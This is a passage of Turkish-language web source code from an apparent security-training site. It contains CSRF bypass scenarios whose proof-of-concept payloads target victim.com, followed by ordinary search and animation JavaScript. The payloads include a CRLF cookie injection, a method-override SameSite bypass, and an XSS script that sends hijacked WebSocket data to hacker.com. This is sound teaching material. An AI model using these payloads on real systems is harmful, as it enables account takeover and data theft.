\"https://victim.com/post/confirmation?postId=1/../../my-account/change-email?email=hacked@mail.com%26submit=1\";\n&lt;/script&gt;</pre><strong>Not:</strong> URL içindeki <code>&</code> karakteri <code>%26</code> olarak encode edilmelidir.</div></details></li><li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 12 - Token Tied to Non-Session Cookie (Cookie Injection)</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> CSRF token session çerezine değil, <code>csrfKey</code> gibi başka bir çereze bağlıdır ve bu çerez session'dan bağımsızdır.<br><div style='margin-top:10px;'><strong>Saldırı Adımları:</strong><br>1. Sitede çerez enjekte edebileceğiniz bir açık bulun (Örn: Search kısmında CRLF/Header Injection).<br>2. Kurbana kendi <code>csrfKey</code> çerezinizi set ettirin: <code>/?search=test%0d%0aSet-Cookie:csrfKey=HACKER_KEY;%20SameSite=None</code><br>3. Form içinde ise bu çerezle eşleşen kendi <code>csrf_token</code> değerinizi gönderin.</div><strong style='margin-top:10px;display:block;'>PoC (Saldırı) Kodu:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;img src=\"https://victim.com/?search=x%0d%0aSet-Cookie:csrfKey=HACKER_KEY\" onerror=\"document.forms[0].submit()\"&gt;\n&lt;form action=\"https://victim.com/change-email\" method=\"POST\"&gt;\n  &lt;input type=\"hidden\" name=\"email\" value=\"hacker@mail.com\" /&gt;\n  &lt;input type=\"hidden\" name=\"csrf\" value=\"HACKER_TOKEN\" /&gt;\n&lt;/form&gt;</pre></div></details></li><li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 13 - SameSite Lax Bypass (Method Override)</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Çerezler <code>SameSite=Lax</code> (varsayılan) korumasındadır. Lax, POST isteklerinde çerez göndermez ama GET isteklerinde (top-level navigation ile) gönderir.<br><div style='margin-top:10px;'><strong>Saldırı Mantığı:</strong> Sunucu <code>_method=POST</code> gibi bir parametre ile metodun üzerine yazılmasına (override) izin veriyorsa, istek <code>GET</code> olarak atılıp Lax duvarı aşılır, sunucu ise bunu <code>POST</code> gibi işler.</div><strong style='margin-top:10px;display:block;'>PoC (Saldırı) Kodu:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;script&gt;\n  document.location = \"https://victim.com/change-email?email=hacked@mail.com&_method=POST\";\n&lt;/script&gt;</pre></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 14 - SameSite Strict Bypass (Sibling Domain & CSWSH)</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Ana domain Strict çerezle korunsa da, aynı site sayılan bir subdomaindeki (sibling domain) XSS üzerinden WebSocket bağlantısı başlatılabilir.<br><strong>Saldırı Zinciri:</strong><br>1. Sibling domainde (örn: <code>cms.victim.com</code>) bir XSS bulunur.<br>2. Tarayıcı bu subdomainden gelen isteği 'Same-Site' saydığı için <code>Strict</code> çerezini ekler.<br><strong style='margin-top:10px;display:block;'>PoC (XSS Payload):</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;script&gt;\n  var ws = new WebSocket('wss://victim.com/chat');\n  ws.onopen = function() { ws.send(\"READY\"); };\n  ws.onmessage = function(event) {\n    fetch('https://hacker.com/log', {method:'POST', body:event.data, mode:'no-cors'});\n  };\n&lt;/script&gt;</pre></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 15 - SameSite Lax Bypass (Cookie Refresh & Popup)</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Chrome'un 'Lax-allowing-unsafe' kuralı (çerez set edildikten sonraki ilk 2 dakika boyunca cross-site POST'a izin verilmesi).<br><strong>Saldırı Yöntemi:</strong><br>1. Kurbanın tıklamasıyla popup açılır (social-login).<br>2. Çerez tazelenir ve 2 dakikalık istisna penceresi başlar.<br><strong style='margin-top:10px;display:block;'>PoC Kodu:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>window.onclick = () => {\n  window.open('https://victim.com/social-login');\n  setTimeout(() => { document.forms[0].submit(); }, 5000);\n}</pre></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 16 - Referer Validation (Fail-Open Policy)</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Sunucu Referer başlığı varsa kontrol ediyor ama başlık yoksa (bazı proxy/bookmark durumları için) isteği kabul ediyor.<br><div style='margin-top:10px;'><strong>Bypass Yöntemi:</strong> HTML içine özel bir meta tag ekleyerek tarayıcının Referer göndermesi engellenir.</div><strong style='margin-top:10px;display:block;'>PoC Kodu:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;meta name=\"referrer\" content=\"no-referrer\"&gt;</pre></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 17 - Broken Referer (Referrer-Policy Bypass)</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Sunucu sadece dize içinde 'victim.com' geçiyor mu diye kontrol ediyor (Simple string match).<br><strong>Teknik:</strong> <code>history.pushState</code> ile URL sonuna domain eklenir ve <code>unsafe-url</code> politikasıyla tam URL'nin gönderilmesi zorlanır.<br><strong style='margin-top:10px;display:block;'>Exploit Server Header:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>Referrer-Policy: unsafe-url\n\n// JS Tarafı:\nhistory.pushState('', '', '/?victim.com')</pre></div></details></li></ul>"

        <ul class='small' style='padding-left:20px;margin:0;'>
          <li><b>Content-Security-Policy (CSP) Yok:</b> Site, XSS saldırılarına karşı en güçlü savunma katmanından birini kaçırıyor demektir.</li>

                if (e.key === 'ArrowDown') selectedIndex = (selectedIndex + 1) % suggestions.length;
                else if (e.key === 'ArrowUp') selectedIndex = (selectedIndex - 1 + suggestions.length) % suggestions.length;
                else if (e.key === 'Enter' && selectedIndex >= 0) { suggestions[selectedIndex].click(); }
                else if (e.key === 'Escape') { 
                    searchInput.value = '';
                    suggestionsDiv.innerHTML = '';
                    suggestionsDiv.classList.remove('visible');
                    selectedIndex = -1;
                }
                suggestions.forEach((sug, idx) => sug.classList.toggle('highlight', idx === selectedIndex));
            };

            const suggestionClickHandler = function (e) {
                const targetSuggestion = e.target.closest('.search-suggestion');
                if (targetSuggestion) {
                    showPage(targetSuggestion.dataset.page);
                    searchInput.value = '';
                    suggestionsDiv.innerHTML = '';
                    suggestionsDiv.classList.remove('visible');
                    selectedIndex = -1;
                }
            };

            searchInput.addEventListener('input', searchHandler);
            searchInput.addEventListener('keydown', keyHandler);
            suggestionsDiv.addEventListener('click', suggestionClickHandler);
        }

      } else if (pageId === 'toolbox') {
        let toolboxHtml = `<h1>${page.title}</h1><p class="lead">${page.description || ''}</p><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">`;
        page.categories.forEach(category => {
          toolboxHtml += `<h2>${category.categoryTitle}</h2>`;
          let cardsHtml = category.tools.map(tool => `<div class="tool-card" data-tool-id="${tool.id}"><i class="${tool.icon} tool-icon"></i><h3 class="tool-title">${tool.title}</h3><p class="tool-description">${tool.description}</p><span class="tool-link">Aracı Aç →</span></div>`).join('');
          toolboxHtml += `<div class="tool-grid-container">${cardsHtml}</div>`;
        });
        main.innerHTML = toolboxHtml;
        document.querySelectorAll('.tool-card').forEach(card => {
          card.addEventListener('click', () => openTool(card.dataset.toolId));
        });
      } else {
        let html = `<h1>${page.title || ''}</h1><p class="lead">${page.description || ''}</p>`;
        if (page.sections) {
          page.sections.forEach(section => {
            html += `<div class="card"><h3>${section.title}</h3>${section.content}</div>`;
          });
        }
        main.innerHTML = html;
      }

      if (pageId === 'forum') {
        window.location.href = '/forum/';
        return;
      }

      window.scrollTo({
        top: 0,
        behavior: 'smooth'
      });

      const canvas = document.getElementById('matrixCanvas');
      if (canvas) {
          const ctx = canvas.getContext('2d');
          const parent = canvas.parentElement;
          canvas.width = parent.offsetWidth;
          canvas.height = parent.offsetHeight;

          const chars = "0101010101010101ABCDEFHIJKLMNOPQRSTUVXYZ@#$%&*+-".split("");
          const fontSize = 14;
          const columns = canvas.width / fontSize;
          const drops = [];

          for (let x = 0; x < columns; x++) drops[x] = 1;

          function drawMatrix() {
              ctx.fillStyle = "rgba(9, 9, 11, 0.1)"; 
              ctx.fillRect(0, 0, canvas.width, canvas.height);

              ctx.fillStyle = "#8b5cf6";
              ctx.font = fontSize + "px monospace";

              for (let i = 0; i < drops.length; i++) {
                  const text = chars[Math.floor(Math.random() * chars.length)];
                  ctx.fillText(text, i * fontSize, drops[i] * fontSize);

                  if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                      drops[i] = 0;
                  }
                  drops[i]++;
              }
          }
          const matrixInterval = setInterval(drawMatrix, 50);
          window.addEventListener('hashchange', () => clearInterval(matrixInterval), { once: true });
      }
    }

    function activateParamFinder() {
      const findButton = document.getElementById('findParamButton');
